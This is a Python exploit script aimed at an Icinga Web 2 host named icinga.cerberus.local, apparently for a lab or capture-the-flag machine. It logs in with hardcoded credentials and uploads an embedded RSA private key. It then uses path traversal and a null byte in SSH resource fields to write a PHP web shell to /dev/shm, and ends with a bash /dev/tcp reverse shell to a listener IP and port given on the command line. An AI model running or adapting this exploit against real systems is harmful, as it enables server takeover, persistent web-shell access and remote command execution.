import requests
import bs4
import argparse
import random
import string

def get_csrf(resp):
    soup = bs4.BeautifulSoup(resp.text, "lxml")
    csrf_token = soup.find("input", {"id": "CSRFToken"})["value"]
    return csrf_token


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='lol')
    parser.add_argument('-i', '--ip', help='nc listener ip', required=True)
    parser.add_argument('-p', '--port', help='nc listener port', required=True)

    args = parser.parse_args()

    session = requests.session()

    # LOGIN
    URL = "http://icinga.cerberus.local:8080/icingaweb2/authentication/login"
    resp = session.get(URL)
    csrf_token = get_csrf(resp)
    data = {"username":"matthew","password":"IcingaWebPassword2023","rememberme":"0","redirect":"","formUID":"form_login","CSRFToken":csrf_token,"btn_submit":"Login"}
    resp = session.post(URL, data=data)

    # CHANGE MODULE PATH
    URL = "http://icinga.cerberus.local:8080/icingaweb2/config/general"
    resp = session.get(URL)
    csrf_token = get_csrf(resp)
    data = {"global_show_stacktraces":"0","global_show_stacktraces":"1","global_show_application_state_messages":"0","global_show_application_state_messages":"1","global_module_path":"/dev/","global_config_resource":"icingaweb2","logging_log":"syslog","logging_level":"ERROR","logging_application":"icingaweb2","logging_facility":"user","themes_default":"Icinga","themes_disabled":"0","authentication_default_domain":"","formUID":"form_config_general","CSRFToken":csrf_token,"btn_submit":"Save Changes"}
    resp = session.post(URL, data=data)

    # ENABLE MODULE
    URL = "http://icinga.cerberus.local:8080/icingaweb2/config/moduleenable"
    resp = session.get(URL)
    csrf_token = get_csrf(resp)
    data = {"identifier":"shm","CSRFToken":csrf_token,"btn_submit":"btn_submit"}
    resp = session.post(URL, data=data)

    # UPLOAD SSH KEY
    URL = "http://icinga.cerberus.local:8080/icingaweb2/config/createresource"
    resp = session.get(URL)
    csrf_token = get_csrf(resp)
    data = {"type":"ssh","name":"test","user":"test","private_key":"-----BEGIN RSA PRIVATE KEY-----\r\n\
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\r\n\
-----END RSA PRIVATE KEY-----","formUID":"form_config_resource","CSRFToken":csrf_token,"btn_submit":"Save Changes"}
    resp = session.post(URL, data=data)

    # EXPLOIT: WRITE PHP FILE
    URL = "http://icinga.cerberus.local:8080/icingaweb2/config/createresource"
    resp = session.get(URL)
    csrf_token = get_csrf(resp)
    data = {"type":"ssh","name":"asdf2","user":"../../../../../dev/shm/run.php","private_key":"file:///etc/icingaweb2/ssh/test\x00<?php system($_REQUEST['cmd']);?>","formUID":"form_config_resource","CSRFToken":csrf_token,"btn_submit":"Save Changes"}
    resp = session.post(URL, data=data)

    # GET REVERSE SHELL
    URL = "http://icinga.cerberus.local:8080/icingaweb2/shm/run"
    data = {"cmd":"bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(args.ip,args.port)}
    session.post(URL, data=data)
